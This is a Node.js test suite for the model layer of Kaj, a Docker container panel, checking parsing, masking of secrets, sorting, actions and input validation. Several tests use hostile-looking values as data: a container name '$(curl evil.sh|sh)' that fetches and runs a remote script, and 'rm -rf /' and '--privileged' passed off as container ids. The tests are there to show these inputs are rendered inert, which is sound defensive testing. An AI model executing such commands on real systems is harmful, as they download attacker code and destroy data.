const assert = require("node:assert/strict");
const fs = require("node:fs");
const vm = require("node:vm");
const test = require("node:test");

const source = fs.readFileSync(new URL("../Model.js", `file://${__dirname}/`), "utf8")
  .replace(/^\.pragma library\s*/m, "");
const model = {};
vm.createContext(model);
vm.runInContext(source, model);

// Model.js runs inside a vm context, so the arrays and objects it returns come
// from a different realm and are never reference-equal to the ones built here.
// deepStrictEqual compares prototypes, so it rejects a structurally identical
// result. Round-tripping through JSON re-creates the value in this realm.
const plain = (value) => JSON.parse(JSON.stringify(value));

// --- Untrusted text ---------------------------------------------------------

test("stripAnsi removes colour codes, OSC strings, and 8-bit CSI", () => {
  assert.equal(model.stripAnsi("\x1b[31mred\x1b[0m"), "red");
  assert.equal(model.stripAnsi("\x1b]0;window title\x07after"), "after");
  assert.equal(model.stripAnsi("\x9b31mred"), "red");
  assert.equal(model.stripAnsi("plain"), "plain");
});

test("sanitize strips control bytes a log line could use to repaint the panel", () => {
  assert.equal(model.sanitize("a\x00b\x08c"), "abc");
  assert.equal(model.sanitize("keep\nnewlines"), "keep\nnewlines");
  // Carriage return is a control byte: without stripping it, a log line can
  // overwrite what was already drawn on the row.
  assert.equal(model.sanitize("first\rsecond"), "firstsecond");
});

test("sanitize caps runaway length", () => {
  const out = model.sanitize("x".repeat(9000), 100);
  assert.equal(out.length, 101);
  assert.ok(out.endsWith("…"));
});

test("sanitizeLine folds newlines so a crafted name cannot fake extra rows", () => {
  assert.equal(model.sanitizeLine("evil\nadmin"), "evil admin");
  assert.equal(model.sanitizeLine("tab\tsep"), "tab sep");
});

test("a shell-injection container name survives as inert text", () => {
  // Kaj never builds shell strings, but the name must also render harmlessly.
  const name = "$(curl evil.sh|sh)";
  assert.equal(model.displayName("/" + name), name);
});

// --- Secrets ----------------------------------------------------------------

test("every env value is hidden by default", () => {
  const entries = model.envEntries([
    "NODE_ENV=production",
    "DB_PASSWORD=hunter2",
    "EMPTY="
  ]);
  // No key is treated as more sensitive than another: guessing is what leaks.
  assert.equal(entries[0].masked, "••••••••");
  assert.equal(entries[1].masked, "••••••••");
  // The real value stays available for the reveal, but is not what renders.
  assert.equal(entries[1].value, "hunter2");
  // An unset value reads as unset, which gives nothing away.
  assert.equal(entries[2].masked, "");
  // The mask is fixed width, so it does not leak the length either.
  assert.equal(entries[0].masked, entries[1].masked);
});

test("env splits on the first = only", () => {
  const e = model.envEntries(["DATABASE_URL=postgres://u:p@h/db?x=1"])[0];
  assert.equal(e.key, "DATABASE_URL");
  assert.equal(e.value, "postgres://u:p@h/db?x=1");
});

// --- Parsing ----------------------------------------------------------------

test("parseJsonLines skips malformed lines instead of failing the refresh", () => {
  const parsed = model.parseJsonLines('{"a":1}\nnot json\n\n{"b":2}');
  assert.deepEqual(plain(parsed), [{ a: 1 }, { b: 2 }]);
});

test("parseJsonLines survives the cursor codes docker stats wraps records in", () => {
  // Verbatim shape of a `docker stats --format '{{json .}}'` line on a pipe:
  // Docker still emits cursor-home/erase codes around every record.
  const raw = '\x1b[H{"ID":"d6f3594ad3a2","CPUPerc":"0.91%","MemUsage":"74.27MiB / 7.628GiB"}\x1b[K\n\x1b[K\n\x1b[J';
  const parsed = model.parseJsonLines(raw);
  assert.equal(parsed.length, 1);
  assert.equal(parsed[0].ID, "d6f3594ad3a2");
  assert.equal(model.normalizeStat(parsed[0]).cpu, 0.91);
});

test("normalizeContainer flattens the inspect payload", () => {
  const raw = {
    Id: "d6f3594ad3a2c7f29efc28a1b34a419314f922235b0d7fe37d8773d6832d9d09",
    Name: "/twitch-drops-miner",
    Created: "2026-08-23T12:00:43.654415099Z",
    State: {
      Running: true, Paused: false, Restarting: false, Dead: false,
      OOMKilled: false, ExitCode: 0, Status: "running",
      StartedAt: "2026-08-24T17:35:53.442426434Z",
      Health: { Status: "healthy" }
    },
    Labels: { "com.docker.compose.project": "media", "com.docker.compose.service": "miner" },
    Image: "dungfu/twitch-drops-miner:latest",
    Ports: { "5800/tcp": [{ HostIp: "0.0.0.0", HostPort: "5800" }, { HostIp: "::", HostPort: "5800" }] },
    RestartCount: 0
  };

  const c = model.normalizeContainer(raw);
  assert.equal(c.shortId, "d6f3594ad3a2");
  assert.equal(c.name, "twitch-drops-miner");
  assert.equal(c.running, true);
  assert.equal(c.health, "healthy");
  assert.equal(c.project, "media");
  assert.equal(c.service, "miner");
  // The v4/v6 pair Docker reports for one -p flag collapses to a single entry.
  assert.equal(c.ports.length, 1);
  assert.equal(c.ports[0].hostPort, 5800);
});

test("a container with no healthcheck reports no health, not unhealthy", () => {
  const c = model.normalizeContainer({ Id: "abc123def456", Name: "/x", State: { Running: true } });
  assert.equal(c.health, "");
  assert.equal(model.containerSeverity(c), "ok");
});

test("parseTime treats Docker's zero timestamp as never", () => {
  assert.equal(model.parseTime("0001-01-01T00:00:00Z"), 0);
  assert.equal(model.parseTime(""), 0);
  assert.ok(model.parseTime("2026-08-24T17:35:53Z") > 0);
});

test("unpublished ports are kept but not browsable", () => {
  const ports = model.normalizePorts({ "80/tcp": null });
  assert.equal(ports.length, 1);
  assert.equal(ports[0].published, false);
  assert.equal(model.browsableUrl(ports[0]), "");
});

test("browsableUrl only links loopback-reachable tcp bindings", () => {
  assert.equal(
    model.browsableUrl({ published: true, protocol: "tcp", hostIp: "0.0.0.0", hostPort: 8080 }),
    "http://localhost:8080"
  );
  assert.equal(
    model.browsableUrl({ published: true, protocol: "tcp", hostIp: "0.0.0.0", hostPort: 443 }),
    "https://localhost:443"
  );
  // Bound to one specific non-loopback interface: shown, but not linked.
  assert.equal(
    model.browsableUrl({ published: true, protocol: "tcp", hostIp: "192.168.1.5", hostPort: 8080 }),
    ""
  );
  assert.equal(
    model.browsableUrl({ published: true, protocol: "udp", hostIp: "0.0.0.0", hostPort: 53 }),
    ""
  );
});

// --- Stats ------------------------------------------------------------------

test("stats strings parse into numbers", () => {
  assert.equal(model.parsePercent("3.49%"), 3.49);
  assert.equal(model.parsePercent("garbage"), 0);
  assert.equal(model.parseSize("74.71MiB"), 74.71 * 1048576);
  assert.equal(model.parseSize("1GB"), 1e9);

  const pair = model.parseUsagePair("74.71MiB / 7.628GiB");
  assert.ok(Math.abs(pair.used - 74.71 * 1048576) < 1);
  assert.ok(Math.abs(pair.limit - 7.628 * 1073741824) < 1);
});

test("mergeStats keys by short id without mutating the previous map", () => {
  const first = model.mergeStats({}, { ID: "abc123def456", CPUPerc: "5%", MemUsage: "10MiB / 1GiB" });
  const second = model.mergeStats(first, { ID: "999888777666", CPUPerc: "1%", MemUsage: "5MiB / 1GiB" });
  assert.equal(Object.keys(first).length, 1);
  assert.equal(Object.keys(second).length, 2);
  assert.equal(second["abc123def456"].cpu, 5);
});

// --- Grouping and severity --------------------------------------------------

function container(overrides) {
  return Object.assign({
    id: "id", shortId: "id", name: "n", image: "i", running: true, paused: false,
    restarting: false, dead: false, oomKilled: false, exitCode: 0, health: "",
    restartCount: 0, startedAt: 0, project: "", service: ""
  }, overrides);
}

test("severity escalates for the states worth interrupting someone about", () => {
  assert.equal(model.containerSeverity(container({})), "ok");
  assert.equal(model.containerSeverity(container({ oomKilled: true })), "error");
  assert.equal(model.containerSeverity(container({ health: "unhealthy" })), "error");
  assert.equal(model.containerSeverity(container({ running: false, exitCode: 1 })), "error");
  assert.equal(model.containerSeverity(container({ restarting: true })), "warn");
  assert.equal(model.containerSeverity(container({ health: "starting" })), "warn");
  // A clean stop is not a problem.
  assert.equal(model.containerSeverity(container({ running: false, exitCode: 0 })), "ok");
});

test("rollup reports the worst container in the set", () => {
  assert.equal(model.rollupSeverity([container({}), container({ restarting: true })]), "warn");
  assert.equal(
    model.rollupSeverity([container({}), container({ restarting: true }), container({ oomKilled: true })]),
    "error"
  );
  assert.equal(model.rollupSeverity([]), "ok");
});

test("groupByProject sorts projects alphabetically and puts standalone last", () => {
  const groups = model.groupByProject([
    container({ name: "loose", project: "" }),
    container({ name: "web", project: "zeta", service: "web" }),
    container({ name: "db", project: "alpha", service: "db" })
  ]);
  assert.deepEqual(plain(groups.map(g => g.project)), ["alpha", "zeta", ""]);
  assert.equal(groups[2].standalone, true);
  assert.equal(groups[0].running, 1);
  assert.equal(groups[0].total, 1);
});

test("containers sort running first, then by service name", () => {
  const group = model.groupByProject([
    container({ project: "p", service: "b", running: true }),
    container({ project: "p", service: "a", running: false }),
    container({ project: "p", service: "c", running: true })
  ])[0];
  assert.deepEqual(plain(group.containers.map(c => c.service)), ["b", "c", "a"]);
});

// --- Formatting -------------------------------------------------------------

test("formatUptime is compact at every scale", () => {
  const now = 1000000000000;
  assert.equal(model.formatUptime(now - 30 * 1000, now), "30s");
  assert.equal(model.formatUptime(now - 5 * 60 * 1000, now), "5m");
  assert.equal(model.formatUptime(now - 90 * 60 * 1000, now), "1h 30m");
  assert.equal(model.formatUptime(now - 50 * 3600 * 1000, now), "2d 2h");
  assert.equal(model.formatUptime(0, now), "");
});

test("formatBytes and formatPercent stay short enough for a bar popup", () => {
  assert.equal(model.formatBytes(0), "0 B");
  assert.equal(model.formatBytes(999), "999 B");
  assert.equal(model.formatBytes(1500), "1.5 KB");
  assert.equal(model.formatBytes(78336000), "78.3 MB");
  assert.equal(model.formatPercent(3.49), "3.5%");
  assert.equal(model.formatPercent(42.7), "43%");
});

test("statusSummary omits uptime while a healthcheck is still starting", () => {
  const now = 1000000000000;
  const starting = container({ health: "starting", startedAt: now - 90 * 1000 });
  // No elapsed time: it has not meaningfully been "up" for anything yet.
  assert.equal(model.statusSummary(starting, now), "Starting");

  // Unhealthy keeps its uptime — how long it has been failing is the point.
  const unhealthy = container({ health: "unhealthy", startedAt: now - 90 * 1000 });
  assert.equal(model.statusSummary(unhealthy, now), "Unhealthy · up 1m");
});

test("uptime advances with the clock it is given", () => {
  const started = 1000000000000;
  const c = container({ startedAt: started });
  // The bug this guards: a fixed startedAt means the label only moves if the
  // caller passes a current timestamp.
  assert.equal(model.statusSummary(c, started + 5 * 1000), "Up 5s");
  assert.equal(model.statusSummary(c, started + 5 * 60 * 1000), "Up 5m");
  assert.equal(model.statusSummary(c, started + 2 * 3600 * 1000), "Up 2h 0m");
});

test("statusSummary leads with the reason a container is not running", () => {
  assert.equal(model.statusSummary(container({ oomKilled: true })), "Out of memory");
  assert.equal(model.statusSummary(container({ running: false, exitCode: 137 })), "Exited (137)");
  assert.equal(model.statusSummary(container({ running: false, exitCode: 0 })), "Stopped");
  assert.equal(model.statusSummary(container({ restarting: true, restartCount: 3 })), "Restarting ×3");
  assert.equal(model.statusSummary(container({ paused: true })), "Paused");
});

test("barSummary answers the glance question", () => {
  assert.equal(model.barSummary([]), "No containers");
  assert.equal(model.barSummary([container({}), container({ running: false })]), "1 of 2 running");
});

// --- Actions ----------------------------------------------------------------

test("available actions never contradict container state", () => {
  assert.ok(model.availableActions(container({ running: true })).includes("stop"));
  assert.ok(!model.availableActions(container({ running: true })).includes("start"));
  assert.ok(model.availableActions(container({ running: false })).includes("start"));
  assert.ok(!model.availableActions(container({ running: false })).includes("stop"));
  // Removing a running container is not offered at all.
  assert.ok(!model.availableActions(container({ running: true })).includes("remove"));
  assert.ok(model.availableActions(container({ paused: true, running: true })).includes("unpause"));
});

test("only genuinely destructive verbs require confirmation", () => {
  assert.ok(model.isDestructive("remove"));
  assert.ok(model.isDestructive("removeVolumes"));
  assert.ok(model.isDestructive("prune"));
  // Friction on routine verbs is what teaches people to click through the
  // dialog that actually matters.
  assert.ok(!model.isDestructive("stop"));
  assert.ok(!model.isDestructive("restart"));
  assert.ok(!model.isDestructive("start"));
});

test("confirm text names the container and what is lost", () => {
  const c = container({ name: "api" });
  assert.ok(model.confirmText("remove", c).includes("api"));
  assert.ok(model.confirmText("remove", c).includes("volumes are kept"));
  assert.ok(model.confirmText("removeVolumes", c).includes("lost"));
  assert.equal(model.confirmVerb("remove"), "Remove");
});

// --- Search and status filtering --------------------------------------------

test("matchesQuery searches name, service, project, image, and short id", () => {
  const c = container({
    name: "web-1", service: "web", project: "shop",
    image: "nginx:alpine", shortId: "abc123def456"
  });
  assert.ok(model.matchesQuery(c, "web"));
  assert.ok(model.matchesQuery(c, "shop"));
  assert.ok(model.matchesQuery(c, "nginx"));
  assert.ok(model.matchesQuery(c, "abc123"));
  assert.ok(model.matchesQuery(c, "WEB"), "case-insensitive");
  assert.ok(model.matchesQuery(c, "  web  "), "trims");
  assert.ok(model.matchesQuery(c, ""), "empty query matches everything");
  assert.ok(!model.matchesQuery(c, "postgres"));
});

test("matchesQuery is substring, not fuzzy", () => {
  const c = container({ name: "database", service: "", project: "", image: "", shortId: "" });
  assert.ok(model.matchesQuery(c, "abas"));
  // A fuzzy matcher would accept this; substring must not.
  assert.ok(!model.matchesQuery(c, "dbs"));
});

test("status filters partition the list", () => {
  const running = container({ running: true });
  const stopped = container({ running: false, exitCode: 0 });
  const crashed = container({ running: false, exitCode: 1 });

  assert.ok(model.matchesStatus(running, "running"));
  assert.ok(!model.matchesStatus(running, "stopped"));
  assert.ok(model.matchesStatus(stopped, "stopped"));
  assert.ok(model.matchesStatus(crashed, "problems"));
  assert.ok(!model.matchesStatus(running, "problems"));
  // A crashed container is both stopped and a problem.
  assert.ok(model.matchesStatus(crashed, "stopped"));
  assert.ok(model.matchesStatus(running, "all"));
});

test("filterContainers applies status and query together", () => {
  const list = [
    container({ name: "web", running: true }),
    container({ name: "web-old", running: false, exitCode: 0 }),
    container({ name: "db", running: true })
  ];
  assert.equal(model.filterContainers(list, "", "all").length, 3);
  assert.equal(model.filterContainers(list, "web", "all").length, 2);
  assert.equal(model.filterContainers(list, "web", "running").length, 1);
  assert.equal(model.filterContainers(list, "nothing", "all").length, 0);
});

test("chip counts reflect what clicking the chip will show", () => {
  const list = [
    container({ name: "web", running: true }),
    container({ name: "web-old", running: false, exitCode: 1 }),
    container({ name: "db", running: true })
  ];
  const all = model.statusCounts(list, "");
  assert.deepEqual(plain(all), { all: 3, running: 2, stopped: 1, problems: 1 });

  // Counts must narrow with the query, or a chip would advertise a number its
  // own click cannot produce.
  const searched = model.statusCounts(list, "web");
  assert.deepEqual(plain(searched), { all: 2, running: 1, stopped: 1, problems: 1 });
});

// --- Keyboard cursor --------------------------------------------------------

test("flattenGroups walks groups as one sequence", () => {
  const groups = model.groupByProject([
    container({ name: "a", project: "one", service: "a" }),
    container({ name: "b", project: "two", service: "b" }),
    container({ name: "c", project: "one", service: "c" })
  ]);
  assert.deepEqual(plain(model.flattenGroups(groups).map(c => c.name)), ["a", "c", "b"]);
});

test("moveCursor wraps at both ends", () => {
  assert.equal(model.moveCursor(-1, 1, 3), 0, "first j selects the top row");
  assert.equal(model.moveCursor(-1, -1, 3), 2, "first k selects the bottom row");
  assert.equal(model.moveCursor(0, 1, 3), 1);
  assert.equal(model.moveCursor(2, 1, 3), 0, "past the end comes back to the top");
  assert.equal(model.moveCursor(0, -1, 3), 2, "before the start goes to the bottom");
  assert.equal(model.moveCursor(0, 1, 1), 0, "a single row has nowhere to go");
  assert.equal(model.moveCursor(0, 1, 0), -1, "empty list has no cursor");
});

test("cursor follows its container across a refresh", () => {
  const before = [container({ id: "a" }), container({ id: "b" }), container({ id: "c" })];
  // Same containers, reordered by a refresh: the cursor tracks the id, not the row.
  const after = [container({ id: "c" }), container({ id: "a" }), container({ id: "b" })];
  assert.equal(model.cursorIndexForId(after, "b", 1), 2);
  // The tracked container disappeared: fall back to the old position, clamped.
  assert.equal(model.cursorIndexForId([container({ id: "z" })], "b", 2), 0);
  assert.equal(model.cursorIndexForId([], "b", 1), -1);
});

test("Enter runs one intent regardless of container state", () => {
  assert.equal(model.primaryAction(container({ running: true })), "stop");
  assert.equal(model.primaryAction(container({ running: false })), "start");
  assert.equal(model.primaryAction(container({ running: true, paused: true })), "unpause");
});

test("search opens on / and on Ctrl+F's control character", () => {
  assert.ok(model.isSearchKey("/"));
  // Qt puts the ASCII control code for F in event.text for Ctrl+F.
  assert.ok(model.isSearchKey("\x06"));
  assert.ok(!model.isSearchKey("f"));
  assert.ok(!model.isSearchKey("r"));
  assert.ok(!model.isSearchKey(""));
});

// --- Errors -----------------------------------------------------------------

test("a container vanishing mid-refresh is not surfaced as an error", () => {
  // Exactly what `docker inspect` writes when ids are removed between the
  // listing and the inspect — the race the two-step snapshot accepts.
  const noise = [
    "Error response from daemon: No such container: 62b9493de98f77c7",
    "Error response from daemon: No such container: 6bfde6546db5dc78",
    "Error response from daemon: No such container: 50b209ea79bc7487"
  ].join("\n");
  assert.equal(model.firstRealError(noise), "");
  assert.ok(model.isMissingContainerError(noise.split("\n")[0]));
});

test("a real error is surfaced, and only the first one", () => {
  const mixed = [
    "Error response from daemon: No such container: 62b9493de98f77c7",
    "Error response from daemon: permission denied while trying to connect",
    "Error response from daemon: something else entirely"
  ].join("\n");
  assert.equal(
    model.firstRealError(mixed),
    "Error response from daemon: permission denied while trying to connect"
  );
});

test("firstRealError caps length and handles empty input", () => {
  assert.equal(model.firstRealError(""), "");
  assert.equal(model.firstRealError("   \n  \n"), "");
  assert.ok(model.firstRealError("x".repeat(500)).length <= 201);
});

// --- Action feedback --------------------------------------------------------

test("intendedAction is separate from whether the action can run", () => {
  const stopped = container({ running: false });
  // The key means "shell" even though a stopped container has none. Conflating
  // the two is what made an unavailable action indistinguishable from a dead
  // keybind.
  assert.equal(model.intendedAction("s", stopped), "shell");
  assert.equal(model.unavailableReason("shell", stopped, false), stopped.name + " is not running");
  assert.equal(model.intendedAction("z", stopped), "");
  // p flips with the container's state.
  assert.equal(model.intendedAction("p", container({ running: true })), "pause");
  assert.equal(model.intendedAction("p", container({ running: true, paused: true })), "unpause");
});

test("unavailableReason says what to do, not just that it failed", () => {
  const running = container({ running: true, name: "api" });
  assert.equal(model.unavailableReason("remove", running), "Stop api before removing it");
  assert.equal(model.unavailableReason("shell", container({ running: false, name: "api" })), "api is not running");
  assert.equal(model.unavailableReason("restart", container({ running: false, name: "api" })), "Start api instead");
  assert.equal(model.unavailableReason("remove", null), "Select a container first");
  // Available actions produce no reason at all.
  assert.equal(model.unavailableReason("stop", running), "");
  assert.equal(model.unavailableReason("remove", container({ running: false })), "");
});

test("busyLabel describes the action in progress", () => {
  assert.equal(model.busyLabel("stop"), "Stopping…");
  assert.equal(model.busyLabel("restart"), "Restarting…");
  assert.equal(model.busyLabel("unpause"), "Resuming…");
  assert.equal(model.busyLabel("removeVolumes"), "Removing…");
  assert.equal(model.busyLabel("mystery"), "Working…");
});

test("linkablePorts keeps only what can actually be opened", () => {
  const c = container({ ports: [
    { published: true, protocol: "tcp", hostIp: "0.0.0.0", hostPort: 8080 },
    { published: true, protocol: "tcp", hostIp: "::", hostPort: 8080 },
    { published: false, protocol: "tcp", hostIp: "", hostPort: 0 },
    { published: true, protocol: "udp", hostIp: "0.0.0.0", hostPort: 53 },
    { published: true, protocol: "tcp", hostIp: "192.168.1.5", hostPort: 9090 }
  ] });
  const links = model.linkablePorts(c);
  // The v4/v6 pair collapses to one link; udp, unpublished, and the
  // non-loopback binding are dropped.
  assert.deepEqual(plain(links), [{ port: 8080, url: "http://localhost:8080" }]);
  assert.deepEqual(plain(model.linkablePorts(container({}))), []);
});

// --- Compose ----------------------------------------------------------------

test("compose commands address the project by name", () => {
  assert.deepEqual(plain(model.composeCommand("shop", "stop")),
    ["docker", "compose", "--project-name", "shop", "stop"]);
  assert.deepEqual(plain(model.composeCommand("shop", "down")),
    ["docker", "compose", "--project-name", "shop", "down"]);
  // up needs the config file, which Kaj cannot rely on still existing.
  assert.equal(model.composeCommand("shop", "up"), null);
  assert.equal(model.composeCommand("", "stop"), null);
  assert.equal(model.composeCommand("shop", "rm -rf"), null);
});

test("compose down is confirmed and names what goes", () => {
  assert.ok(model.isDestructive("down"));
  const text = model.composeConfirmText("shop", 2, 3);
  assert.ok(text.includes("shop"));
  assert.ok(text.includes("3 containers"));
  assert.ok(text.includes("network"));
  assert.ok(text.includes("volumes are kept"));
});

// --- Images and disk --------------------------------------------------------

test("dangling images are named rather than shown as <none>", () => {
  const tagged = model.normalizeImage({ ID: "269abb53b32d", Repository: "busybox", Tag: "latest", Size: "6.73MB", Containers: "15" });
  assert.equal(tagged.name, "busybox:latest");
  assert.equal(tagged.dangling, false);
  assert.equal(tagged.containers, 15);
  assert.ok(Math.abs(tagged.size - 6.73e6) < 1e4);

  const dangling = model.normalizeImage({ ID: "abc123", Repository: "<none>", Tag: "<none>", Size: "12MB", Containers: "0" });
  assert.equal(dangling.dangling, true);
  assert.equal(dangling.name, "untagged");
});

test("images sort largest first", () => {
  const list = model.normalizeImages([
    { ID: "a", Repository: "small", Tag: "1", Size: "5MB", Containers: "0" },
    { ID: "b", Repository: "big", Tag: "1", Size: "500MB", Containers: "0" }
  ]);
  assert.deepEqual(plain(list.map(i => i.name)), ["big:1", "small:1"]);
});

test("disk rows parse counts and reclaimable size", () => {
  const rows = model.normalizeDisk([
    { Type: "Images", TotalCount: "2", Active: "2", Size: "90.32MB", Reclaimable: "0B (0%)" },
    { Type: "Build Cache", TotalCount: "9", Active: "0", Size: "1.2GB", Reclaimable: "1.2GB (100%)" }
  ]);
  assert.equal(rows.length, 2);
  assert.equal(rows[0].total, 2);
  assert.equal(rows[0].reclaimable, 0);
  assert.ok(Math.abs(rows[1].reclaimable - 1.2e9) < 1e6);
  assert.ok(Math.abs(model.totalReclaimable(rows) - 1.2e9) < 1e6);
});

test("image search matches name and id", () => {
  const image = model.normalizeImage({ ID: "269abb53b32d", Repository: "dungfu/twitch-drops-miner", Tag: "latest", Size: "83.6MB", Containers: "1" });
  assert.ok(model.matchesImageQuery(image, "twitch"));
  assert.ok(model.matchesImageQuery(image, "269abb"));
  assert.ok(!model.matchesImageQuery(image, "postgres"));
});

test("memory pressure is measured against the container's own limit", () => {
  const limited = { memoryLimit: 512 * 1e6 }
  assert.equal(model.memoryPressure(limited, { memUsed: 128 * 1e6 }), 0.25)
  // No limit means no pressure to report: the host's total says nothing
  // about whether this container is near trouble.
  assert.equal(model.memoryPressure({ memoryLimit: 0 }, { memUsed: 128 * 1e6 }), -1)
  assert.equal(model.memoryPressure(limited, null), -1)
  assert.equal(model.memoryPressure(null, { memUsed: 1 }), -1)
})

test("limits are parsed from inspect, with 0 meaning unlimited", () => {
  const limited = model.normalizeContainer({
    Id: "a1", Name: "/api", State: { Status: "running", Running: true },
    MemoryLimit: 536870912, NanoCpus: 1500000000
  })
  assert.equal(limited.memoryLimit, 536870912)
  assert.equal(limited.cpuLimit, 1.5)

  const unlimited = model.normalizeContainer({
    Id: "a2", Name: "/web", State: { Status: "running", Running: true },
    MemoryLimit: 0, NanoCpus: 0
  })
  assert.equal(unlimited.memoryLimit, 0)
  assert.equal(unlimited.cpuLimit, 0)
})

test("cpu pressure is measured against the container's own cpu ration", () => {
  // 150% of a host's cores is meaningless without knowing the ration: here it
  // is exactly the 1.5 CPUs this container was given.
  assert.equal(model.cpuPressure({ cpuLimit: 1.5 }, { cpu: 150 }), 1);
  assert.equal(model.cpuPressure({ cpuLimit: 2 }, { cpu: 50 }), 0.25);
  assert.equal(model.cpuPressure({ cpuLimit: 0 }, { cpu: 150 }), -1);
  assert.equal(model.cpuPressure(null, { cpu: 1 }), -1);
});

test("memory is formatted in binary units, disk in decimal", () => {
  // `docker stats` says 512MiB and `--memory 512m` means MiB; `docker images`
  // and `docker system df` report decimal. Kaj follows each convention where
  // it belongs rather than picking one and being wrong half the time.
  assert.equal(model.formatMemory(536870912), "512 MiB");
  assert.equal(model.formatMemory(1024), "1.0 KiB");
  assert.equal(model.formatMemory(0), "0 B");
  assert.equal(model.formatBytes(536870912), "537 MB");
});

test("volume users count stopped containers, network members do not", () => {
  const containers = [
    { name: "api", running: true, mounts: ["data"], networks: ["app"] },
    { name: "old", running: false, mounts: ["data"], networks: ["app"] }
  ];
  // `docker volume rm` refuses while a stopped container still references it.
  assert.deepEqual(plain(model.volumeUsers(containers, "data")), ["api", "old"]);
  // A stopped container has no endpoint, and Docker will remove the network
  // without complaint, so it is not a member.
  assert.deepEqual(plain(model.networkMembers(containers, "app")), ["api"]);
  assert.deepEqual(plain(model.volumeUsers(containers, "nothing")), []);
});

test("bind mounts never make a volume look used", () => {
  const c = model.normalizeContainer({
    Id: "a1", Name: "/api", State: { Status: "running", Running: true },
    Mounts: [
      { Type: "volume", Name: "data" },
      { Type: "bind", Source: "/home/leon/src" }
    ],
    Networks: { app: {}, bridge: {} }
  });
  assert.deepEqual(plain(c.mounts), ["data"]);
  assert.deepEqual(plain(c.networks), ["app", "bridge"]);
});

test("usage label names a few users and counts the rest", () => {
  assert.equal(model.usageLabel([]), "unused");
  assert.equal(model.usageLabel(["a", "b"]), "a, b");
  assert.equal(model.usageLabel(["a", "b", "c", "d", "e"]), "a, b, c +2");
});

test("volume labels survive Docker's flat label string", () => {
  const volumes = model.normalizeVolumes([
    { Name: "small", Size: "1.2MB", Labels: "com.docker.compose.project=shop" },
    { Name: "big", Size: "4GB", Labels: "" }
  ]);
  // Largest first, the same as images.
  assert.equal(volumes[0].name, "big");
  assert.equal(volumes[0].size, 4e9);
  assert.equal(volumes[1].project, "shop");
});

test("built-in networks sort last and are marked", () => {
  const networks = model.normalizeNetworks([
    { Id: "n1", Name: "bridge", Driver: "bridge" },
    { Id: "n2", Name: "app", Driver: "bridge", Labels: { "com.docker.compose.project": "shop" },
      IPAM: { Config: [{ Subnet: "172.18.0.0/16" }] } }
  ]);
  assert.equal(networks[0].name, "app");
  assert.equal(networks[0].subnet, "172.18.0.0/16");
  assert.equal(networks[0].project, "shop");
  assert.equal(networks[0].builtin, false);
  assert.equal(networks[1].builtin, true);
});

test("parseJson takes a whole document and refuses anything else", () => {
  assert.deepEqual(plain(model.parseJson('[{"Name":"v"}]')), [{ Name: "v" }]);
  assert.deepEqual(plain(model.parseJson("")), []);
  assert.deepEqual(plain(model.parseJson("not json")), []);
  assert.deepEqual(plain(model.parseJson('{"Name":"v"}')), []);
});

test("parseIds accepts only what a docker id can be", () => {
  assert.deepEqual(plain(model.parseIds("e30a359770d8\nrm -rf /\n0123456789ab\n")),
    ["e30a359770d8", "0123456789ab"]);
});

test("scrolling stops at both edges", () => {
  // Room to move: one step down.
  assert.equal(model.scrollTarget(0, 1, 46, 1000, 400), 46);
  // Never above the top, however hard you press.
  assert.equal(model.scrollTarget(0, -1, 46, 1000, 400), 0);
  // Never past the last row: 1000 of content in a 400 viewport bottoms out
  // at 600, not at whatever the step would have reached.
  assert.equal(model.scrollTarget(580, 1, 46, 1000, 400), 600);
  // Content shorter than the viewport cannot scroll at all.
  assert.equal(model.scrollTarget(0, 1, 46, 200, 400), 0);
});

test("read-only says what is actually in the way", () => {
  const running = container({ id: "a", name: "api", running: true });
  // Not read-only: the advice is sound, stop it and you can remove it.
  assert.equal(model.unavailableReason("remove", running, false),
    "Stop api before removing it");
  // Read-only: the old advice was useless, because stopping is refused too.
  assert.equal(model.unavailableReason("remove", running, true), "Read-only mode is on");
  assert.equal(model.unavailableReason("stop", running, true), "Read-only mode is on");
  assert.equal(model.unavailableReason("logs", running, true), "");
});

test("read-only leaves only the actions that can run", () => {
  const running = container({ id: "a", name: "api", running: true });
  assert.deepEqual(plain(model.availableActions(running, true)), ["logs"]);
  assert.deepEqual(plain(model.availableActions(running, false)),
    ["stop", "restart", "pause", "logs", "shell"]);
});

test("ids are checked before they reach a command line", () => {
  assert.equal(model.isValidId("0123456789ab"), true);
  assert.equal(model.isValidId("a".repeat(64)), true);
  assert.equal(model.isValidId("a".repeat(65)), false);
  assert.equal(model.isValidId("z".repeat(64)), false);
  // Kaj honours DOCKER_HOST, so the daemon is not automatically trusted.
  assert.equal(model.isValidId("--privileged"), false);
  assert.equal(model.isValidId("-rf /"), false);
  assert.equal(model.isValidId("short"), false);
  assert.equal(model.isValidId(""), false);
  assert.equal(model.isValidId(null), false);
});

test("notification text cannot carry markup", () => {
  // Notification daemons render the body as styled text.
  assert.equal(model.notificationText("<b>api</b>"), "&lt;b&gt;api&lt;/b&gt;");
  assert.equal(model.notificationText("a & b"), "a &amp; b");
  assert.equal(model.notificationText("api"), "api");
});
